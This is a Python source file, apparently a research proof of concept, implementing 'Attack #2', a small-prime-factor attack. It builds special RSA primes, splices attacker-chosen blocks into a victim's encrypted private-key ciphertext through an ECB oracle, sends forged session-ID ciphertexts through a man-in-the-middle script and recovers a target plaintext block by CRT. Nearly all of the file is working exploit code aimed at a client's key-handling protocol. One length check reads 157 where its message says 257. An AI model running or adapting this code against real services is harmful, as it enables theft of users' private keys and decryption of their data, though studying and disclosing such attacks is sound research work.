# Attack #2

import Crypto.Util.number  # PyCryptodome
import sage.all as sage

from attack_utils import *
from mitm_utils import get_many_ecb_blocks, get_two_ecb_blocks, get_one_ecb_block

# attack parameters

BITLEN_R = 12
VERSION = 'full'

#
# utilities
#

def getPrime(blen):
    prime = sage.random_prime(2**blen - 1, False, 2**(blen - 1) + 1)
    assert bitlen(prime) == blen
    return prime

def isPrime(number):
    return sage.is_pseudoprime(number)

def getSpecialPrime(blen, product, num_rest_primes=4):
    """
    :param blen: desired bit-length of the prime
    :param product: the product that should be a factor of (prime - 1)
    :param num_rest_primes: the number of primes to "fill up" the rest of the bit-length (optional)

    :returns number, rest: the prime itself and the list of additional factors
    """
    assert bitlen(product) < blen

    while True:
        rest_len = blen - bitlen(product)
        rest_prime_len = ceil_int_div(rest_len, num_rest_primes) + 1

        rest = []
        rest_product = 1
        for i in range(num_rest_primes):
            rest_prime = getPrime(rest_prime_len)
            rest.append(rest_prime)
            rest_product *= rest_prime
            if i != num_rest_primes - 1:
                rest_len -= bitlen(rest_prime)
                rest_prime_len = ceil_int_div(rest_len, num_rest_primes - i - 1)

        number = product * rest_product * 2 + 1

        if bitlen(number) == blen and isPrime(number):
            break
    return number, rest

#
# main attack
#

class SmallPrimeAttack(Attack):

    def __init__(self, ecbOracle, privk: bytes, csid: bytes, uh: str, targetBlock: bytes, version=VERSION, stats=False, primeBitlen=BITLEN_R):
        print("Initialising attack 2...")
        self.e = PK_EXP
        self.ecbOracle = ecbOracle
        self.csid = csid  # original RSA sid ciphertext
        self.uh = uh  # original userhandle
        self.privk = privk  # original privk ciphertext
        self.targetBlock = targetBlock  # to recover plaintext of
        self.version = version
        self.primeBitlen = primeBitlen
        self.isDone = False

        if self.version != 'full':
            raise NotImplementedError("Only the full version of Attack #2 is implemented")

        # will be set during precomputation
        self.generators = None
        self.ts = None

        self.precompute()
        self.precomputePrivk()

        # set counters
        self._current_r_index = 0  # iterate over self.primes
        self._current_x = 2  # 2 <= x < r 
        self._testing_x = 2

        # for disambiguation strategy
        self._current_t_index = 0  # moves forward upon confirmation of no hit
        self._testing_t_index = 0  # due to batching, need two indices 
        self.disambiguating = False
        self.alternative = False # for when utf8 confirmation fails

        # store found values
        self.target_mod = []
        self.xts = []
        self.fixing = False

        print("Attack initialisation done!")

        self.last_csid = None

        r = self.getCurrentPrime()
        print("\nSet next prime: r = {}".format(r))
        #print("g =", self.generators[r])

    # the following helper functions manage the counters for r, x and t so that the attack can process batched requests

    def getCurrentPrime(self):
        return self.primes[self._current_r_index]

    def setNextPrime(self):
        assert 0 <= self._current_r_index < len(self.primes)

        self._current_r_index += 1

        # reset r-specific counters
        self._current_x = 2
        self._testing_x = 2
        self._current_t_index = 0 
        self._testing_t_index = 0 
        self.disambiguating = False
        self.alternative = False

        if self.fixing:
            x, _ = self.xts[self._current_r_index]
            self._current_x = x
            self._testing_x = x

        if self._current_r_index == len(self.primes):
            self.isDone = True
        else:
            r = self.getCurrentPrime()
            print("\nSet next prime: r = {}".format(r))
            #print("g =", self.generators[r])

    def resetPrime(self):
        # only for the special case when the attack finished
        assert self.fixing

        self._current_r_index = 0
        x, _ = self.xts[self._current_r_index]
        self._current_x = x
        self._testing_x = x

        r = self.getCurrentPrime()
        print("\nReset next prime: r = {}".format(r))

    def getX(self, current=True):
        if current:
            return self._current_x  # the last x for which we got responses
        else:
            return self._testing_x  # the last x that we tried

    def setNextX(self, r, current=True):
        assert 2 <= self._current_x < r  # the next x should never reach r without a hit

        if self.fixing:
            self._current_r_index += 1
        else:
            if current:
                self._current_x += 1
            else:
                self._testing_x += 1

    def getT(self, r, current=True):
        assert r in self.primes
        assert self.disambiguating

        if current:  # similarly, the last t for which we got responses
            assert 0 <= self._current_t_index < len(self.ts[r])
            return self.ts[r][self._current_t_index]
        else:  # the last t that we tried
            assert 0 <= self._testing_t_index < len(self.ts[r])
            return self.ts[r][self._testing_t_index]

    def getNextT(self, r, i=1):
        assert r in self.primes
        assert self.disambiguating and self.alternative
        assert 0 <= self._testing_t_index < len(self.ts[r])

        if self._testing_t_index < len(self.ts[r]) - i:
            return self.ts[r][self._testing_t_index + i]
        else:
            return self.ts[r][0]  # loop over if last value needs to be tested (technically unnecessary though)

    def setNextT(self, r, current=True, t=None):
        assert r in self.primes
        assert self.disambiguating

        if current:
            if t is None:
                assert 0 <= self._current_t_index < len(self.ts[r])  # the next t may reach the last option without a hit
                self._current_t_index += 1
            else:
                self._current_t_index = t
        else:
            if t is None:
                assert 0 <= self._testing_t_index < len(self.ts[r])
                self._testing_t_index += 1
            else:
                self._current_t_index = t

    def needAlternative(self, r, current=True):
        # check if we ran out of t values to try without confirmation
        assert r in self.primes
        assert self.disambiguating

        if current:
            return self._current_t_index == len(self.ts[r])
        else:
            return self._testing_t_index >= len(self.ts[r])

    def resetT(self):
        self._current_t_index = 0
        self._testing_t_index = 0

    # main attack functions

    def genSmallPrimes(self):
        """
        Generate a number of small primes such that their product is of length 
        BLOCK_BITLEN bits, to serve as factors of (p-1) and (q-1).
        """
        print("Generating small prime factors...")
        
        self.primes = []
        self.product = 1
        while bitlen(self.product) <= BLOCK_BITLEN:
            r = Crypto.Util.number.getPrime(self.primeBitlen)
            if r not in self.primes:
                self.primes.append(r)
                self.product *= r

        print("primes =", self.primes)

        rs_in_p = ceil_int_div(len(self.primes), 2)
        self.productp = list_product(self.primes[:rs_in_p])
        self.productq = list_product(self.primes[rs_in_p:])
        assert self.product == list_product([self.productp, self.productq])

    def precompute(self):
        """
        Main precomputation for attack:
        1. Generate small prime factors
        2. Compute generators of order determined by the factors
        3. Compute t values for which the oracle returns "true"
        """
        seeking = True
        while seeking:
            self.genSmallPrimes()

            print("Generating p, q...")

            # precompute p, q of the special form, not block-aligned
            self.p, self.restp = getSpecialPrime(BYTELEN_P * 8, self.productp)
            print("p =", self.p)
            self.q, self.restq = getSpecialPrime(BYTELEN_Q * 8, self.productq)
            print("q =", self.q)
            assert bitlen(self.p) == bitlen(self.q) == BYTELEN_P * 8
            assert sage.gcd(self.p, self.q) == 1

            # new modulus
            self.n = self.p * self.q
            self.n_bytelen = bytelen(self.n)

            if self.n_bytelen not in [256,157]:
                print("Attack for now only works with bytelen(n) = 256 or 257")
                exit(1)

            self.phi = (self.p - 1) * (self.q - 1)

            # just sanity checking
            if type(self.restp) == type(self.restq) == list:
                assert (self.productp * list_product(self.restp) * 2) * (self.productq * list_product(self.restq) * 2) == self.phi
            else:
                assert (self.productp * self.restp * 2) * (self.productq * self.restq * 2) == self.phi

            # precompute g's and t's, this step may fail
            self.generators = self.precomputeGs()
            self.ts, _ = self.precomputeTs()

            if len(self.ts.keys()) == len(self.primes):
                seeking = False

    def precomputeGs(self):
        """
        For each small prime factor r, find a generator g whose order is r.

        Note: if the bytelength of n is 257, the work done here makes
        the function precomputeTs() obsolete (however, it's still run).
        """
        print("Precomputing generators...")

        generators = {}
        for r in self.primes:
            tries = 0
            # first, find any generator of given order
            while True:
                tries += 1
                rand_el = sage.randint(2,self.n - 1)
                if sage.gcd(rand_el, self.n) != 1:
                    continue
                exp = self.phi // r
                g = sage.power_mod(rand_el, exp, self.n)
                if g != 1:
                    break

            # the bytelength of n influences in what form we get the oracle
            if self.n_bytelen == 257:
                flag = False
                h = g
                for i in range(1, r - 2):
                    if is_2nd_byte_zero(h, self.n_bytelen):
                        # here we need to *get* the 2nd 0x00 byte,
                        # to make the disambiguation strategy later work
                        flag = True
                        break
                    h = (h * g) % self.n
                    assert h != 1 and sage.power_mod(h, r, self.n) == 1
                if flag != True:  # for 14 10-bit factors breaks w/ probability ~1/4
                    print("Failure, please run from start again.")
                g = h

            generators[r] = g
            assert sage.power_mod(g, r, self.n) == 1
        return generators

    def precomputeTs(self):
        """
        For each factor r and its corresponding generator, find a value t 
        such that g^t mod n has 2nd byte 0x00.

        Note: if the bytelength of n is 257, this is doing unnecessary work and could 
        be sped up, however the webclient oracle does not work for such n due to
        bugs in the bigint implementation of modular power.
        """
        print("Precomputing t's...")

        ts = dict()
        special = []  # for marking two-0x00 values
        self.g_shifts = dict()
        self.uhs = dict()
        for r in self.primes:
            f_ts = []
            m = self.generators[r]
            g_shift_found = False
            for t in range(1, r):
                if is_2nd_byte_zero(m, self.n_bytelen):
                    f_ts.append(t)
                    if is_ith_byte_zero(1, m, self.n_bytelen):
                        special.append((r, t))
                elif not g_shift_found:
                    s = is_uh_utf8(m, self.n_bytelen)
                    if s != None:
                        self.g_shifts[r] = t
                        self.uhs[r] = s
                        g_shift_found = True
                m = (m * self.generators[r]) % self.n

            if f_ts == []:
                print("no t's for r = {}, restarting!".format(r))
                break
            elif not g_shift_found:
                print("no utf-8 generator for r = {}, restarting!".format(r))
                break
            
            # shift to get the right generator that contains a utf-8 substring
            self.generators[r] = pow(self.generators[r], self.g_shifts[r], self.n)
            f_ts = [(t * sage.inverse_mod(self.g_shifts[r], r)) % r for t in f_ts]
            for t in f_ts:
                assert is_2nd_byte_zero(int(pow(self.generators[r], t, self.n)), self.n_bytelen)
            ts[r] = f_ts

        return ts, special

    def precomputePrivk(self):
        """
        Generate the modified ECB ciphertext to use in the attack.
        """
        print("Constructing modified privk...")

        # this will be reused by later calls
        zero = long_to_bytes(0, BLOCK_BYTELEN)
        one = long_to_bytes(1, BLOCK_BYTELEN)
        self.zeroBlock, self.oneBlock = get_two_ecb_blocks(self.ecbOracle, zero, one)

        # u should pass the inverse check
        u = sage.inverse_mod(self.q, self.p)

        if self.version == 'full':
            delta = ((-2**2047 -1) * sage.inverse_mod(2**(48+128), self.product)) % self.product
            d = 2**2047 + 2**(48+128) * delta + 1
            assert d % self.product == 0

        else:
            raise NotImplementedError

        ciphertext = self.stitch(self.q, self.p, d, u, self.targetBlock)
        self.modified_privk = url_encode(ciphertext).decode("utf-8")

    def stitch(self, q, p, d, u, targetBlock):
        """
        Stitch the attacker-chosen values (using the ECB oracle) together with the target ciphertext block.
        """
        enc_q = len_encode(long_to_bytes(q, BYTELEN_Q))
        enc_p = len_encode(long_to_bytes(p, BYTELEN_P))
        enc_d = len_encode(long_to_bytes(d, BYTELEN_D))
        enc_u = len_encode(long_to_bytes(u, BYTELEN_U))

        pt_0 = enc_q + enc_p + enc_d[:12]
        pt_d = enc_d[204:220] + enc_d[220:236]

        pad = rand_str(8)
        pt_1 = enc_d[252:] + enc_u + pad

        first_part = get_many_ecb_blocks(self.ecbOracle, pt_0) + self.zeroBlock * (blocklen(enc_d[2:]) - 4) + get_many_ecb_blocks(self.ecbOracle, pt_d)
        second_part = get_many_ecb_blocks(self.ecbOracle, pt_1)

        ct = first_part + targetBlock + second_part
        assert blocklen(ct) == (2 + BYTELEN_Q + 2 + BYTELEN_P + 2 + BYTELEN_D + 2 + BYTELEN_U + 8) // BLOCK_BYTELEN

        return ct

    # the following methods are for the mitm script
    
    def get_privk(self):

        return self.modified_privk

    def next_csid(self):
        """
        Generate the attacker-made RSA ciphertexts that are sent in place of the one encrypting an sid.
        These are of the form c = g^x mod n for x = 1, ..., f where f is one of the factors.
        """

        r = self.getCurrentPrime()
        x = self.getX(current=False)

        if x == r - 1:
            # this is unlikely to happen but could also use the final failover strategy
            print("ran out of x values, abort!")
            return "abort"

        if self.version == 'simple':
            raise NotImplementedError

        elif self.version == 'full':
            if not self.disambiguating:
                c = pow(self.generators[r], x, self.n)
                self.setNextX(r, current=False)
            else:
                x = self.getX()

                if not self.alternative and self.needAlternative(r, current=False):
                    print("next_csid:\tswitch to alternative method")  # means we never got the confirmation via utf8 sid (or due to batching :/)
                    self.alternative = True
                    self.resetT()
                
                if self.alternative and self.needAlternative(r, current=False):  # the condition could also be there's a difference between current and testing
                    print("next_csid:\talternative method ran out of t's, move on to the next x")
                    self.disambiguating = True
                    self.alternative = False
                    self.resetT()                    
                    self.setNextX(r)
                    x = self.getX()
                    t = self.getT(r, current=False)
                    x_new = (x * sage.inverse_mod(t, r)) % r
                    c = pow(self.generators[r], x_new, self.n)
                    self.setNextT(r, current=False)
                elif not self.alternative:  # main disambiguation strategy
                    t = self.getT(r, current=False)
                    x_new = (x * sage.inverse_mod(t, r)) % r
                    c = pow(self.generators[r], x_new, self.n)
                    self.setNextT(r, current=False)
                else:  # alternative in case the above strategy fails
                    t1 = self.getT(r, current=False)
                    t2 = self.getNextT(r)  # use the next possible hit to confirm t1 as the value, without setting it
                    x_new = (x * sage.inverse_mod(t1, r) * t2) % r
                    i = 1
                    while x_new == 1:  # eliminating false negatives
                        i += 1
                        t2 = self.getNextT(r, i)
                        x_new = (x * sage.inverse_mod(t1, r) * t2) % r
                    c = pow(self.generators[r], x_new, self.n)
                    self.last_csid = c
                    self.setNextT(r, current=False)
            return encode_long_to_str(int(c), self.n_bytelen)

        else:
            raise NotImplementedError

    def next_uh(self):

        r = self.getCurrentPrime()
        return self.uhs[r]

    def mark_hit(self):
        """
        When the oracle returns 'true', start disambiguating or confirm tested value of t, depending on the state.
        """

        r = self.getCurrentPrime()
        x = self.getX()

        if self.version == 'simple':
            raise NotImplementedError

        elif self.version == 'full':
            if not self.disambiguating:
                print("mark_hit:\tgot hit for r = {}, x = {}".format(r, x))
                if self.fixing:
                    self.disambiguating = True
                    x_old, t_old = self.xts[self._current_r_index]
                    if x_old == x:
                        print("mark_hit:\t confirmed correct x, now test t")
                        self.setNextT(r, t=t_old)
                        self.setNextT(r, current=False, t=t_old)
                    else:
                        print("mark_hit:\t got a different x, now find the right t")
                elif len(self.ts[r]) == 1:
                    print("mark_hit:\tgot single t")
                    t = self.ts[r][0]
                    self.target_mod.append((sage.inverse_mod(2**48, r) * sage.inverse_mod(x, r) * t) % r)
                    self.xts.append((x,t))
                    self.setNextPrime()
                else:
                    print("mark_hit:\tstart disambiguating")
                    print("ts =", self.ts[r])
                    self.disambiguating = True
            else:
                if not self.alternative:
                    #print("mark_hit:\twe got second 0x00 byte during disambiguation") # main strategy is confirmed via a different request type
                    self.mark_continue()
                else:
                    #print("mark_hit:\talternative strategy got hit")
                    self.mark_confirm()
    
        else:
            raise NotImplementedError

    # the [1,14] request (wrong uh)
    def mark_continue(self):
        """
        When the oracle returns 'false', continue testing further values of x.
        """

        r = self.getCurrentPrime()

        if not self.disambiguating:
            self.setNextX(r)
            if self.fixing:
                print("x value was wrong, should correct it")         
        else:
            if not self.alternative and self.needAlternative(r):
                print("mark_continue:\tswitch to alternative method")  # means we never got the confirmation via utf8 sid
                self.alternative = True
                self.resetT()
            elif self.alternative and self.needAlternative(r):
                print("mark_continue:\talternative method also failed, keep looking for another x")
                self.alternative = False
                self.resetT()
                self.disambiguating = False
                self.setNextX(r)
            else:
                self.setNextT(r)
                
    # the sid request
    def mark_confirm(self):
        """
        Resolve disambiguation and continue with the next prime factor.
        """

        r = self.getCurrentPrime()
        x = self.getX()

        if not self.disambiguating:
            print("mark_confirm:\tgot hit for r = {}, x = {}".format(r, x))
            self.xts.append((x,1))
            self.target_mod.append((sage.inverse_mod(2**48, r) * sage.inverse_mod(x, r)) % r)
        else:
            t = self.getT(r)
            print("mark_confirm:\tgot confirmation for r = {}, x = {}, t = {}".format(r, x, t))
            if self.fixing:
                print("mark_confirm:\tt was correct, move to the next pair")
            else:
                self.xts.append((x,t))
            self.target_mod.append((sage.inverse_mod(2**48, r) * sage.inverse_mod(x, r) * t) % r)

        self.setNextPrime()  # move over to the next prime

    def finish(self):
        """
        Conclude the recovery of the target block via CRT.
        """
        assert self.isDone == True
        print("Attack is finished!")
        recoveredBlock = sage.crt(self.target_mod, self.primes)
        assert recoveredBlock != 0  # this should not happen, only a guard in case there were false positives

        if bitlen(recoveredBlock) <= 128:  # easy to determine failure case
            print("recovered data: {}".format(hex(recoveredBlock)))
            self.fail()
            return b''
        else:
            recoveredBytes = long_to_bytes(recoveredBlock, BLOCK_BYTELEN)
            print("recovered block: {}".format(recoveredBytes.hex()))

            if self.ecbOracle.call(recoveredBytes + recoveredBytes) != self.targetBlock + self.targetBlock:  # for-sure failure case
                self.fail()
            
            return recoveredBytes


    def fail(self):
        """
        The attack can verify whether its output is correct, and if it is not output a failure.
        """
        print("Attack failed! (likely one of x or t values is slightly wrong due to request batching)")
        print("x's and t's: {}".format(self.xts))

        # it's possible to identify the value that is wrong
        self.fixing = True
        self.isDone = False

        self.resetPrime()
        self.target_mod = []
        